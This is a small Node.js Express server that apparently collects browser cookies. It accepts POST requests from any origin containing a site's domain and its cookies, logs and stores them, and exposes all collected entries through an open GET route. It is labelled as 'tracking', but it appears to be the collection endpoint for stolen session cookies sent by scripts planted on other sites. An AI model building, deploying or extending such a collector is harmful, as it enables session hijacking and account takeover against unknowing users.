const express = require("express");
const fs = require("fs");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 80;
const LOG_FILE = "tracked_domains.json";

// Middleware to parse JSON requests and enable CORS
app.use(bodyParser.json());
app.use(express.json());
//app.use(cors());


// Enable CORS for all origins (for development, you might want to restrict this later)
app.use(cors({
    origin: "*",  // For development purposes, you might want to change this
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"]
}));

// Function to save tracked data
function saveData(data) {
    let existingData = [];

    // Check if log file exists
    if (fs.existsSync(LOG_FILE)) {
        const fileData = fs.readFileSync(LOG_FILE);
        existingData = JSON.parse(fileData);
    }

    // Append new data
    existingData.push(data);

    // Save updated data back to file
    fs.writeFileSync(LOG_FILE, JSON.stringify(existingData, null, 2));
}

// Enable CORS
app.use(cors({
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"]
}));

// Use JSON parser
app.use(express.json());

// In-memory storage (data will be lost if the server restarts)
let trackedDomains = [];

// API to receive tracking data
app.post("/", (req, res) => {
    const { domain,cookies } = req.body;

    if (!domain) {
        return res.status(400).json({ error: "Missing domain" });
    }

    console.log(`Received domain: ${domain} , ${cookies.toString()}`);

    // Save domain with timestamp (temporary storage)
    trackedDomains.push({ domain, cookies,timestamp: new Date().toISOString() });

    res.status(200).json({ message: "Domain logged successfully" });
});

// API to fetch logs
app.get("/", (req, res) => {
    res.json(trackedDomains);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
